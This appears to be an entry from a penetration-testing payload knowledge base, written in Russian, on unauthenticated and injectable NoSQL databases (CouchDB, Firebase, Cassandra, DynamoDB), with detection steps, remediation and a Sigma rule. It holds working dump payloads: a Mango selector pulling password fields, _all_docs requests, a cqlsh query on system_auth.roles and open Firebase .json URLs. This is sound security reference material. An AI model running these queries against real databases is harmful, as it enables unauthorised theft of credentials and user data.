---
id: nosql-couchdb-firebase-misc
title: "NoSQL прочее: CouchDB, Firebase RTDB, Cassandra, DynamoDB"
type: nosql
target: generic
category: web
difficulty: intermediate
bypass: none
tags: [nosql, couchdb, firebase, cassandra, dynamodb]
tested_on: ["CouchDB 3.x (admin party legacy)", "Firebase RTDB rules", "Cassandra 4.x"]
success_rate: 0.4
risk: high
cwe: "CWE-943"
lab: null
last_verified: "2026-10-23"
references:
  - "https://hackingthe.cloud/"
graph:
  - target: "nosql"
    type: instance_of
  - target: "data-exfiltration"
    type: leads_to
  - target: "default-credentials"
    type: related_to
  - target: "cloud"
    type: related_to
---

# NoSQL прочее: CouchDB, Firebase RTDB, Cassandra, DynamoDB

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
{"selector": {"_id": {"$gt": null}}, "fields": ["_id", "password"], "limit": 1000}
```

## Explanation

Класс один — «NoSQL без аутентификации или с пользовательским языком запросов»:

| Система | Вектор | Признак |
|---------|--------|--------|
| CouchDB | `_all_docs`, `_find` (Mango) без учётки; в старых версиях — «admin party» | `GET /_utils/`, `GET /_all_docs?include_docs=true` |
| Firebase RTDB | `.json`-эндпоинт базы с rules `".read": true` | `https://<proj>.firebaseio.com/.json` |
| Firestore | открытые правила `allow read: if true` | клиентский SDK без токена |
| Cassandra | CQL без аутентификации (порт 9042) | `cqlsh -e 'describe keyspaces'` |
| DynamoDB | избыточные IAM-права `dynamodb:Scan` | сканирование таблиц из скомпрометированной роли |
| Redis (как KV) | `KEYS *` без пароля | см. `payloads/network/redis-unauthenticated.md` |

Отдельно — **инъекция в язык запроса**: Mango/CQL/N1QL собираются строкой,
поэтому пользовательский ввод в `selector`/`WHERE` даёт чтение любых полей,
включая те, которые API не отдаёт.

## Detection

1. Проверьте порт и эндпоинт без учётных данных (`_all_docs`, `.json`, `cqlsh`).
2. Для Firebase: откройте `.json`-URL проекта — если вернулся JSON, правила открыты.
3. Для инъекции: подставьте `{"$gt": null}` в поле фильтра или `'` в CQL-строку.
4. В облачных логах: аномальные `Scan`/`GetItem`-операции, рост исходящего трафика.

## Remediation

- Аутентификация обязательна для всех NoSQL-СУБД (CouchDB `require_valid_user`,
  Cassandra `authenticator: PasswordAuthenticator` + `authorizer`).
- Firebase/Firestore: правила с явным `allow read: if request.auth != null`
  и проверкой владельца документа; регулярный аудит правил в CI.
- Запросы строятся объектами/параметрами, не конкатенацией.
- Сетевая изоляция: 5984/9042/9200/6379 не должны быть доступны из интернета.
- Мониторинг: рост объёма чтения, новые IP в аудите БД.

## Variants

```
GET /_all_docs?include_docs=true
```

```
cqlsh -e "SELECT * FROM system_auth.roles"
```

```
https://<project>.firebaseio.com/users.json
```

## Detection rules

```yaml
title: CouchDB/Firebase — дампы через _all_docs, _find и открытые .json-эндпоинты
id: e5f6a7b8-0078-4e5f-9a7b-000000000078
status: experimental
description: >-
  Запросы к служебным эндпоинтам документных БД: CouchDB _all_docs/_find/
  _utils, Firebase RTDB /.json (shallow, orderBy) без правил доступа.
  В теле — Mango-selector'ы, выгружающие чувствительные поля.
references:
  - https://attack.mitre.org/techniques/T1213/
  - https://attack.mitre.org/techniques/T1190/
logsource:
  category: webserver
  definition: 'access-лог + логи приложения с телом запроса'
detection:
  selection_endpoint:
    cs-uri-stem|contains:
      - '/_all_docs'
      - '_find'
      - '/.json'
      - '/_utils'
      - '/_design/'
      - '/_config'
  selection_body:
    request_body|contains:
      - '"selector"'
      - '"_all_docs"'
      - '"fields": ["_id", "password"'
      - '"limit": 1000'
  condition: selection_endpoint or selection_body
fields:
  - c-ip
  - cs-uri-stem
  - sc-status
  - request_body
falsepositives:
  - синхронизация PouchDB/CouchDB легитимно использует _find — исключайте
    известные клиентские IP/токены
level: high
tags:
  - attack.collection
  - attack.t1190
  - attack.t1213
  - cwe.943
```
